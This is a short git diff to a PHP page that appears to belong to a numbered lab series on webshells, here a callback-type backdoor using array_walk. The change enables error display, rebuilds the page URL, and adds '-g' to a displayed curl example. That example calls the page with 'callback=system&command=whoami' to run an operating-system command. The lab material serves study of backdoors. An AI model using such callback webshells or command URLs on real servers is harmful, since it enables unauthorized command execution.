@@ -1,5 +1,8 @@
 <?php
-	$linux = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?callback=system&amp;command=whoami'
+    error_reporting(E_ALL);
+    ini_set("display_errors", 1);
+    
+	$linux = 'http://' . $_SERVER['HTTP_HOST'] . parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) . '?callback=system&amp;command=whoami'
 ?>
 
 <html>
@@ -11,7 +14,7 @@
 	<h1>013 - WebShell - 回调类型后门 - array_walk</h1>
 
 <p>不正常调用: </p>
-<p>curl '<a href="<?php echo $linux ?>" target="_blank"><?php echo $linux ?></a>'</p>
+<p>curl -g '<a href="<?php echo $linux ?>" target="_blank"><?php echo $linux ?></a>'</p>
 <br>
 <br>
 <?php
